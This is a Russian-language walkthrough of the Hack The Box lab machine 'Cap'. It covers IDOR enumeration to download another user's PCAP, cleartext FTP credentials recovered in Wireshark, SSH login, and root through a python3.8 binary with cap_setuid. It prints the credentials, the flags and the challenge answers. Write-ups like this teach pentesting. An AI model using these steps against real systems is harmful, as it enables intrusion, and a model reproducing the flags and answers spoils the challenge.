# 📘 Hack The Box: Cap

> 🔗 https://app.hackthebox.com/machines/Cap

---

# 🎯 Цель

Получить первоначальный доступ к машине через IDOR-уязвимость в веб-приложении, извлечь учётные данные из сетевого дампа и повысить привилегии до `root` через Linux Capabilities.

---

# 📑 Содержание

- [🧠 Ключевая идея машины](#-ключевая-идея-машины)
- [🧩 Теория: Что такое IDOR](#-теория-что-такое-idor)
- [🧩 Теория: Что такое PCAP](#-теория-что-такое-pcap)
- [🧩 Теория: Linux Capabilities](#-теория-linux-capabilities)
- [🔍 Этап 1 — Разведка](#-этап-1--разведка)
- [🌐 Этап 2 — Анализ веб-приложения](#-этап-2--анализ-веб-приложения)
- [🔓 Этап 3 — Эксплуатация IDOR](#-этап-3--эксплуатация-idor)
- [📡 Этап 4 — Анализ PCAP](#-этап-4--анализ-pcap)
- [🐚 Этап 5 — Получение доступа](#-этап-5--получение-доступа)
- [⬆️ Этап 6 — Privilege Escalation](#-этап-6--privilege-escalation)
- [👑 Этап 7 — Root доступ](#-этап-7--root-доступ)
- [📋 Ответы на задания HTB](#-ответы-на-задания-htb)
- [🧠 Итоговая цепочка атаки](#-итоговая-цепочка-атаки)

---

# 🧠 Ключевая идея машины

Cap демонстрирует, как одна логическая ошибка контроля доступа может привести к полной компрометации системы.

Цепочка атаки:

Web → IDOR → PCAP → FTP Credentials → SSH → Linux Capability Abuse → Root

---

# 🧩 Теория: Что такое IDOR

IDOR (Insecure Direct Object Reference) возникает, когда приложение использует идентификаторы объектов напрямую и не проверяет права доступа.

Пример:

/invoice/1
/invoice/2

Если пользователь может подставить чужой ID и получить данные — это IDOR.

---

# 🧩 Теория: Что такое PCAP

PCAP — файл с захваченным сетевым трафиком.

Его можно открыть в Wireshark и увидеть:

- пакеты;
- логины;
- пароли;
- сетевые соединения.

Если протокол не использует шифрование, данные будут видны открытым текстом.

---

# 🧩 Теория: Linux Capabilities

Linux Capabilities разделяют права root на отдельные привилегии.

Capability:

cap_setuid

позволяет менять UID процесса.

Если процесс может выполнить setuid(0), он становится root.

---

# 🔍 Этап 1 — Разведка

```bash
export IP=10.129.21.10
nmap -sC -sV -v $IP
```

Результат:

```text
21/tcp open ftp
22/tcp open ssh
80/tcp open http
```

Почему это важно:

- FTP часто содержит данные пользователей;
- SSH нужен для получения shell;
- HTTP является основной поверхностью атаки.

---

# 🌐 Этап 2 — Анализ веб-приложения

Открываем:

http://TARGET

Видим Security Dashboard.

Интерес представляет функция:

Security Snapshot

После создания снимка открывается URL:

```text
/data/[id]
```

Как думает пентестер:

Можно ли заменить ID и получить чужой файл?

---

# 🔓 Этап 3 — Эксплуатация IDOR

Проверяем:

```text
/data/0
```

Скачивается чужой дамп.

Почему это работает:

Приложение проверяет существование объекта, но не проверяет права пользователя.

Как защититься:

- серверная авторизация;
- UUID вместо последовательных ID;
- аудит доступа.

---

# 📡 Этап 4 — Анализ PCAP

```bash
wireshark 0.pcap
```

Находим:

```text
USER nathan
PASS Buck3tH4TF0RM3!
```

Почему пароль виден:

FTP не шифрует трафик.

Любой пользователь с доступом к дампу увидит пароль.

---

# 🐚 Этап 5 — Получение доступа

```bash
ssh nathan@TARGET
```

Используем найденный пароль.

<details>
<summary>🔐 Показать пароль</summary>

Buck3tH4TF0RM3!

</details>

Проверяем:

```bash
whoami
```

Результат:

```text
nathan
```

## 🔐 User Flag

<details>
<summary>Показать User Flag</summary>

e0f45bef5f9eecde5e15c114c6305f2c

</details>

---

# ⬆️ Этап 6 — Privilege Escalation

Проверяем capabilities:

```bash
getcap -r / 2>/dev/null
```

Находим:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Почему это опасно:

Python может менять UID процесса.

Эксплуатация:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

UID 0 = root.

---

# 👑 Этап 7 — Root доступ

```bash
whoami
```

Результат:

```text
root
```

## 🔐 Root Flag

<details>
<summary>Показать Root Flag</summary>

85038ac80672331a1c72019bd26b1af7

</details>

---

# 📋 Ответы на задания HTB

<details>
<summary>Показать ответы</summary>

1. 3
2. data
3. yes
4. 0
5. ftp
6. ssh
7. e0f45bef5f9eecde5e15c114c6305f2c
8. /usr/bin/python3.8
9. 85038ac80672331a1c72019bd26b1af7

</details>

---

# 🧠 Итоговая цепочка атаки

```text
nmap
→ Web Dashboard
→ IDOR
→ download pcap
→ Wireshark
→ FTP credentials
→ SSH
→ getcap
→ cap_setuid
→ root
```
